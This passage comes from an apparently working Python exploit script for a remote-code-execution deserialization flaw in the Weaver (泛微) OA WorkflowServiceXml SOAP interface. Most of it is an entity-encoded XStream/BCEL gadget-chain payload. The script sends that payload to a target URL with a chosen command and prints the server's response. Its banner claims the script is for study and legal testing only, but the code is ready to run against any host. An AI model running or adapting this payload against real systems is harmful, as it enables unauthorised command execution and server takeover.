&#52;&#65;&#122;&#36;&#102;&#48;&#56;&#36;&#102;&#54;&#36;&#102;&#50;&#36;&#102;&#57;&#36;&#69;&#36;&#102;&#102;&#109;&#36;&#56;&#52;&#111;&#36;&#101;&#49;&#36;&#71;&#36;&#57;&#97;&#85;&#36;&#101;&#99;&#83;&#49;&#36;&#97;&#48;&#36;&#101;&#50;&#73;&#36;&#86;&#36;&#56;&#51;&#36;&#119;&#36;&#56;&#54;&#36;&#56;&#97;&#36;&#120;&#36;&#100;&#102;&#36;&#102;&#55;&#36;&#88;&#36;&#100;&#55;&#97;&#36;&#86;&#79;&#65;&#36;&#101;&#49;&#36;&#101;&#101;&#36;&#87;&#36;&#102;&#53;&#36;&#102;&#102;&#36;&#72;&#36;&#98;&#52;&#36;&#97;&#49;&#36;&#98;&#56;&#36;&#104;&#36;&#98;&#101;&#36;&#99;&#53;&#72;&#36;&#97;&#57;&#36;&#98;&#53;&#79;&#36;&#36;&#36;&#72;&#36;&#99;&#50;&#84;&#36;&#51;&#100;&#72;&#36;&#56;&#55;&#36;&#78;&#56;&#36;&#102;&#52;&#36;&#95;&#36;&#52;&#48;&#36;&#100;&#54;&#36;&#51;&#102;&#36;&#99;&#102;&#36;&#100;&#98;&#36;&#74;&#36;&#65;&#36;&#65;&#60;&#47;&#115;&#116;&#114;&#105;&#110;&#103;&#62;&#32;&#60;&#47;&#97;&#62;&#32;&#60;&#47;&#111;&#117;&#116;&#101;&#114;&#45;&#99;&#108;&#97;&#115;&#115;&#62;&#32;&#60;&#47;&#110;&#97;&#109;&#101;&#115;&#62;&#32;&#60;&#112;&#114;&#111;&#99;&#101;&#115;&#115;&#111;&#114;&#67;&#76;&#32;&#99;&#108;&#97;&#115;&#115;&#61;&#39;&#99;&#111;&#109;&#46;&#115;&#117;&#110;&#46;&#111;&#114;&#103;&#46;&#97;&#112;&#97;&#99;&#104;&#101;&#46;&#98;&#99;&#101;&#108;&#46;&#105;&#110;&#116;&#101;&#114;&#110;&#97;&#108;&#46;&#117;&#116;&#105;&#108;&#46;&#67;&#108;&#97;&#115;&#115;&#76;&#111;&#97;&#100;&#101;&#114;&#39;&#62;&#32;&#60;&#112;&#97;&#114;&#101;&#110;&#116;&#32;&#99;&#108;&#97;&#115;&#115;&#61;&#39;&#115;&#117;&#110;&#46;&#109;&#105;&#115;&#99;&#46;&#76;&#97;&#117;&#110;&#99;&#104;&#101;&#114;&#36;&#69;&#120;&#116;&#67;&#108;&#97;&#115;&#115;&#76;&#111;&#97;&#100;&#101;&#114;&#39;&#62;&#32;&#60;&#47;&#112;&#97;&#114;&#101;&#110;&#116;&#62;&#32;&#60;&#112;&#97;&#99;&#107;&#97;&#103;&#101;&#50;&#99;&#101;&#114;&#116;&#115;&#32;&#99;&#108;&#97;&#115;&#115;&#61;&#39;&#104;&#97;&#115;&#104;&#116;&#97;&#98;&#108;&#101;&#39;&#47;&#62;&#32;&#60;&#99;&#108;&#97;&#115;&#115;&#101;&#115;&#32;&#100;&#101;&#102;&#105;&#110;&#101;&#100;&#45;&#105;&#110;&#61;&#39;&#106;&#97;&#118;&#97;&#46;&#108;&#97;&#110;&#103;&#46;&#67;&#108;&#97;&#115;&#115;&#76;&#111;&#97;&#100;&#101;&#114;&#39;&#47;&#62;&#32;&#60;&#100;&#101;&#102;&#97;&#117;&#108;&#116;&#68;&#111;&#109;&#97;&#105;&#110;&#62;&#32;&#60;&#99;&#108;&#97;&#115;&#115;&#108;&#111;&#97;&#100;&#101;&#114;&#32;&#99;&#108;&#97;&#115;&#115;&#61;&#39;&#99;&#111;&#109;&#46;&#115;&#117;&#110;&#46;&#111;&#114;&#103;&#46;&#97;&#112;&#97;&#99;&#104;&#101;&#46;&#98;&#99;&#101;&#108;&#46;&#105;&#110;&#116;&#101;&#114;&#110;&#97;&#108;&#46;&#117;&#116;&#105;&#108;&#46;&#67;&#108;&#97;&#115;&#115;&#76;&#111;&#97;&#100;&#101;&#114;&#39;&#32;&#114;&#101;&#102;&#101;&#114;&#101;&#110;&#99;&#101;&#61;&#39;&#46;&#46;&#47;&#46;&#46;&#39;&#47;&#62;&#32;&#60;&#112;&#114;&#105;&#110;&#99;&#105;&#112;&#97;&#108;&#115;&#47;&#62;&#32;&#60;&#104;&#97;&#115;&#65;&#108;&#108;&#80;&#101;&#114;&#109;&#62;&#102;&#97;&#108;&#115;&#101;&#60;&#47;&#104;&#97;&#115;&#65;&#108;&#108;&#80;&#101;&#114;&#109;&#62;&#32;&#60;&#115;&#116;&#97;&#116;&#105;&#99;&#80;&#101;&#114;&#109;&#105;&#115;&#115;&#105;&#111;&#110;&#115;&#62;&#102;&#97;&#108;&#115;&#101;&#60;&#47;&#115;&#116;&#97;&#116;&#105;&#99;&#80;&#101;&#114;&#109;&#105;&#115;&#115;&#105;&#111;&#110;&#115;&#62;&#32;&#32;&#60;&#107;&#101;&#121;&#62;&#32;&#60;&#47;&#107;&#101;&#121;&#62;&#32;&#60;&#47;&#100;&#101;&#102;&#97;&#117;&#108;&#116;&#68;&#111;&#109;&#97;&#105;&#110;&#62;&#32;&#60;&#100;&#111;&#109;&#97;&#105;&#110;&#115;&#32;&#99;&#108;&#97;&#115;&#115;&#61;&#34;&#106;&#97;&#118;&#97;&#46;&#117;&#116;&#105;&#108;&#46;&#67;&#111;&#108;&#108;&#101;&#99;&#116;&#105;&#111;&#110;&#115;&#36;&#83;&#121;&#110;&#99;&#104;&#114;&#111;&#110;&#105;&#122;&#101;&#100;&#83;&#101;&#116;&#34;&#32;&#115;&#101;&#114;&#105;&#97;&#108;&#105;&#122;&#97;&#116;&#105;&#111;&#110;&#61;&#34;&#99;&#117;&#115;&#116;&#111;&#109;&#34;&#62;&#32;&#60;&#106;&#97;&#118;&#97;&#46;&#117;&#116;&#105;&#108;&#46;&#67;&#111;&#108;&#108;&#101;&#99;&#116;&#105;&#111;&#110;&#115;&#95;&#45;&#83;&#121;&#110;&#99;&#104;&#114;&#111;&#110;&#105;&#122;&#101;&#100;&#67;&#111;&#108;&#108;&#101;&#99;&#116;&#105;&#111;&#110;&#62;&#32;&#60;&#100;&#101;&#102;&#97;&#117;&#108;&#116;&#62;&#32;&#60;&#99;&#32;&#99;&#108;&#97;&#115;&#115;&#61;&#34;&#115;&#101;&#116;&#34;&#62;&#60;&#47;&#99;&#62;&#32;&#60;&#109;&#117;&#116;&#101;&#120;&#32;&#99;&#108;&#97;&#115;&#115;&#61;&#34;&#106;&#97;&#118;&#97;&#46;&#117;&#116;&#105;&#108;&#46;&#67;&#111;&#108;&#108;&#101;&#99;&#116;&#105;&#111;&#110;&#115;&#36;&#83;&#121;&#110;&#99;&#104;&#114;&#111;&#110;&#105;&#122;&#101;&#100;&#83;&#101;&#116;&#34;&#32;&#114;&#101;&#102;&#101;&#114;&#101;&#110;&#99;&#101;&#61;&#34;&#46;&#46;&#47;&#46;&#46;&#47;&#46;&#46;&#34;&#47;&#62;&#32;&#60;&#47;&#100;&#101;&#102;&#97;&#117;&#108;&#116;&#62;&#32;&#60;&#47;&#106;&#97;&#118;&#97;&#46;&#117;&#116;&#105;&#108;&#46;&#67;&#111;&#108;&#108;&#101;&#99;&#116;&#105;&#111;&#110;&#115;&#95;&#45;&#83;&#121;&#110;&#99;&#104;&#114;&#111;&#110;&#105;&#122;&#101;&#100;&#67;&#111;&#108;&#108;&#101;&#99;&#116;&#105;&#111;&#110;&#62;&#32;&#60;&#47;&#100;&#111;&#109;&#97;&#105;&#110;&#115;&#62;&#32;&#60;&#112;&#97;&#99;&#107;&#97;&#103;&#101;&#115;&#47;&#62;&#32;&#60;&#110;&#97;&#116;&#105;&#118;&#101;&#76;&#105;&#98;&#114;&#97;&#114;&#105;&#101;&#115;&#47;&#62;&#32;&#60;&#97;&#115;&#115;&#101;&#114;&#116;&#105;&#111;&#110;&#76;&#111;&#99;&#107;&#32;&#99;&#108;&#97;&#115;&#115;&#61;&#39;&#99;&#111;&#109;&#46;&#115;&#117;&#110;&#46;&#111;&#114;&#103;&#46;&#97;&#112;&#97;&#99;&#104;&#101;&#46;&#98;&#99;&#101;&#108;&#46;&#105;&#110;&#116;&#101;&#114;&#110;&#97;&#108;&#46;&#117;&#116;&#105;&#108;&#46;&#67;&#108;&#97;&#115;&#115;&#76;&#111;&#97;&#100;&#101;&#114;&#39;&#32;&#114;&#101;&#102;&#101;&#114;&#101;&#110;&#99;&#101;&#61;&#39;&#46;&#46;&#39;&#47;&#62;&#32;&#60;&#100;&#101;&#102;&#97;&#117;&#108;&#116;&#65;&#115;&#115;&#101;&#114;&#116;&#105;&#111;&#110;&#83;&#116;&#97;&#116;&#117;&#115;&#62;&#102;&#97;&#108;&#115;&#101;&#60;&#47;&#100;&#101;&#102;&#97;&#117;&#108;&#116;&#65;&#115;&#115;&#101;&#114;&#116;&#105;&#111;&#110;&#83;&#116;&#97;&#116;&#117;&#115;&#62;&#32;&#60;&#99;&#108;&#97;&#115;&#115;&#101;&#115;&#47;&#62;&#32;&#60;&#105;&#103;&#110;&#111;&#114;&#101;&#100;&#95;&#95;&#112;&#97;&#99;&#107;&#97;&#103;&#101;&#115;&#62;&#32;&#60;&#115;&#116;&#114;&#105;&#110;&#103;&#62;&#106;&#97;&#118;&#97;&#46;&#60;&#47;&#115;&#116;&#114;&#105;&#110;&#103;&#62;&#32;&#60;&#115;&#116;&#114;&#105;&#110;&#103;&#62;&#106;&#97;&#118;&#97;&#120;&#46;&#60;&#47;&#115;&#116;&#114;&#105;&#110;&#103;&#62;&#32;&#60;&#115;&#116;&#114;&#105;&#110;&#103;&#62;&#115;&#117;&#110;&#46;&#60;&#47;&#115;&#116;&#114;&#105;&#110;&#103;&#62;&#32;&#60;&#47;&#105;&#103;&#110;&#111;&#114;&#101;&#100;&#95;&#95;&#112;&#97;&#99;&#107;&#97;&#103;&#101;&#115;&#62;&#32;&#32;&#60;&#114;&#101;&#112;&#111;&#115;&#105;&#116;&#111;&#114;&#121;&#32;&#99;&#108;&#97;&#115;&#115;&#61;&#39;&#99;&#111;&#109;&#46;&#115;&#117;&#110;&#46;&#111;&#114;&#103;&#46;&#97;&#112;&#97;&#99;&#104;&#101;&#46;&#98;&#99;&#101;&#108;&#46;&#105;&#110;&#116;&#101;&#114;&#110;&#97;&#108;&#46;&#117;&#116;&#105;&#108;&#46;&#83;&#121;&#110;&#116;&#104;&#101;&#116;&#105;&#99;&#82;&#101;&#112;&#111;&#115;&#105;&#116;&#111;&#114;&#121;&#39;&#62;&#32;&#60;&#95;&#95;&#112;&#97;&#116;&#104;&#62;&#32;&#60;&#112;&#97;&#116;&#104;&#115;&#47;&#62;&#32;&#60;&#99;&#108;&#97;&#115;&#115;&#95;&#95;&#112;&#97;&#116;&#104;&#62;&#46;&#60;&#47;&#99;&#108;&#97;&#115;&#115;&#95;&#95;&#112;&#97;&#116;&#104;&#62;&#32;&#60;&#47;&#95;&#95;&#112;&#97;&#116;&#104;&#62;&#32;&#60;&#95;&#95;&#108;&#111;&#97;&#100;&#101;&#100;&#67;&#108;&#97;&#115;&#115;&#101;&#115;&#47;&#62;&#32;&#60;&#47;&#114;&#101;&#112;&#111;&#115;&#105;&#116;&#111;&#114;&#121;&#62;&#32;&#60;&#100;&#101;&#102;&#101;&#114;&#84;&#111;&#32;&#99;&#108;&#97;&#115;&#115;&#61;&#39;&#115;&#117;&#110;&#46;&#109;&#105;&#115;&#99;&#46;&#76;&#97;&#117;&#110;&#99;&#104;&#101;&#114;&#36;&#69;&#120;&#116;&#67;&#108;&#97;&#115;&#115;&#76;&#111;&#97;&#100;&#101;&#114;&#39;&#32;&#114;&#101;&#102;&#101;&#114;&#101;&#110;&#99;&#101;&#61;&#39;&#46;&#46;&#47;&#112;&#97;&#114;&#101;&#110;&#116;&#39;&#47;&#62;&#32;&#60;&#47;&#112;&#114;&#111;&#99;&#101;&#115;&#115;&#111;&#114;&#67;&#76;&#62;&#32;&#60;&#47;&#105;&#116;&#101;&#114;&#97;&#116;&#111;&#114;&#62;&#32;&#60;&#116;&#121;&#112;&#101;&#62;&#75;&#69;&#89;&#83;&#60;&#47;&#116;&#121;&#112;&#101;&#62;&#32;&#60;&#47;&#101;&#62;&#32;&#60;&#105;&#110;&#32;&#99;&#108;&#97;&#115;&#115;&#61;&#39;&#106;&#97;&#118;&#97;&#46;&#105;&#111;&#46;&#66;&#121;&#116;&#101;&#65;&#114;&#114;&#97;&#121;&#73;&#110;&#112;&#117;&#116;&#83;&#116;&#114;&#101;&#97;&#109;&#39;&#62;&#32;&#60;&#98;&#117;&#102;&#62;&#60;&#47;&#98;&#117;&#102;&#62;&#32;&#60;&#112;&#111;&#115;&#62;&#48;&#60;&#47;&#112;&#111;&#115;&#62;&#32;&#60;&#109;&#97;&#114;&#107;&#62;&#48;&#60;&#47;&#109;&#97;&#114;&#107;&#62;&#32;&#60;&#99;&#111;&#117;&#110;&#116;&#62;&#48;&#60;&#47;&#99;&#111;&#117;&#110;&#116;&#62;&#32;&#60;&#47;&#105;&#110;&#62;&#32;&#60;&#47;&#105;&#115;&#62;&#32;&#60;&#99;&#111;&#110;&#115;&#117;&#109;&#101;&#100;&#62;&#102;&#97;&#108;&#115;&#101;&#60;&#47;&#99;&#111;&#110;&#115;&#117;&#109;&#101;&#100;&#62;&#32;&#32;&#60;&#47;&#100;&#97;&#116;&#97;&#83;&#111;&#117;&#114;&#99;&#101;&#62;&#32;&#60;&#116;&#114;&#97;&#110;&#115;&#102;&#101;&#114;&#70;&#108;&#97;&#118;&#111;&#114;&#115;&#47;&#62;&#32;&#60;&#47;&#100;&#97;&#116;&#97;&#72;&#97;&#110;&#100;&#108;&#101;&#114;&#62;&#32;&#60;&#100;&#97;&#116;&#97;&#76;&#101;&#110;&#62;&#48;&#60;&#47;&#100;&#97;&#116;&#97;&#76;&#101;&#110;&#62;&#32;&#60;&#47;&#99;&#111;&#109;&#46;&#115;&#117;&#110;&#46;&#120;&#109;&#108;&#46;&#105;&#110;&#116;&#101;&#114;&#110;&#97;&#108;&#46;&#98;&#105;&#110;&#100;&#46;&#118;&#50;&#46;&#114;&#117;&#110;&#116;&#105;&#109;&#101;&#46;&#117;&#110;&#109;&#97;&#114;&#115;&#104;&#97;&#108;&#108;&#101;&#114;&#46;&#66;&#97;&#115;&#101;&#54;&#52;&#68;&#97;&#116;&#97;&#62;&#32;&#60;&#99;&#111;&#109;&#46;&#115;&#117;&#110;&#46;&#120;&#109;&#108;&#46;&#105;&#110;&#116;&#101;&#114;&#110;&#97;&#108;&#46;&#98;&#105;&#110;&#100;&#46;&#118;&#50;&#46;&#114;&#117;&#110;&#116;&#105;&#109;&#101;&#46;&#117;&#110;&#109;&#97;&#114;&#115;&#104;&#97;&#108;&#108;&#101;&#114;&#46;&#66;&#97;&#115;&#101;&#54;&#52;&#68;&#97;&#116;&#97;&#32;&#114;&#101;&#102;&#101;&#114;&#101;&#110;&#99;&#101;&#61;&#39;&#46;&#46;&#47;&#99;&#111;&#109;&#46;&#115;&#117;&#110;&#46;&#120;&#109;&#108;&#46;&#105;&#110;&#116;&#101;&#114;&#110;&#97;&#108;&#46;&#98;&#105;&#110;&#100;&#46;&#118;&#50;&#46;&#114;&#117;&#110;&#116;&#105;&#109;&#101;&#46;&#117;&#110;&#109;&#97;&#114;&#115;&#104;&#97;&#108;&#108;&#101;&#114;&#46;&#66;&#97;&#115;&#101;&#54;&#52;&#68;&#97;&#116;&#97;&#39;&#47;&#62;&#32;&#60;&#47;&#106;&#97;&#118;&#97;&#46;&#117;&#116;&#105;&#108;&#46;&#80;&#114;&#105;&#111;&#114;&#105;&#116;&#121;&#81;&#117;&#101;&#117;&#101;&#62;&#32;&#60;&#47;&#106;&#97;&#118;&#97;&#46;&#117;&#116;&#105;&#108;&#46;&#80;&#114;&#105;&#111;&#114;&#105;&#116;&#121;&#81;&#117;&#101;&#117;&#101;&#62;</web:string>
        <web:string>2</web:string>
      </web:doCreateWorkflowRequest>
   </soapenv:Body>
</soapenv:Envelope>'''
    url=url+"/services%20/WorkflowServiceXml"
    response = requests.post(url,data=evilClass,headers=headers,allow_redirects=False)
    if response.status_code == 500:
      return response.text
    elif response.status_code == 404:
      return "页面不存在"
    elif response.status_code == 200:
      return "页面200请尝试其他payload"
    else:
      return "未知错误"
def main():
    print '''               泛微OA/WorkflowServiceXml接口反序列化漏洞RCE By N0phone
                            Example：exp.py url cmd
                                                          仅供学习交流使用 合法测试
    '''
    url=sys.argv[1]
    cmd=sys.argv[2]
    print(hack(url,cmd))

if __name__=='__main__':
 main()